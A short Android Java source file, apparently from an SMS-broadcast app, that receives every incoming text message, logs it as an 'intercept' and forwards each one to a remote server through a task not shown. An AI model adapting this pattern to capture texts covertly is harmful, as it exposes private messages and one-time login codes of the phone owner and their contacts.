package com.starfeel.smsbroadcast;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

public class SMSReceiver extends BroadcastReceiver {
    public SMSReceiver() {
    }

    private final String ACTION_RECEIVE_SMS = "android.provider.Telephony.SMS_RECEIVED";

    @Override
    public void onReceive(Context context, Intent intent) {

        if (intent.getAction().equals(ACTION_RECEIVE_SMS)) {
            Bundle bundle = intent.getExtras();

            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");

                for (int i = 0; i < pdus.length; i++) {

                    SmsMessage m = SmsMessage.createFromPdu((byte[])pdus[i]);

                    Log.i(MainActivity.APPTAG, "Message intercept from `"+m.getDisplayOriginatingAddress()+"`");

                    // Emit message to server --------------------------------------------------

                    ServerTask task = new ServerTask();
                    task.execute(m);

                    Toast.makeText(context, "SMS", Toast.LENGTH_LONG).show();
                }
            }
        }
    }
}
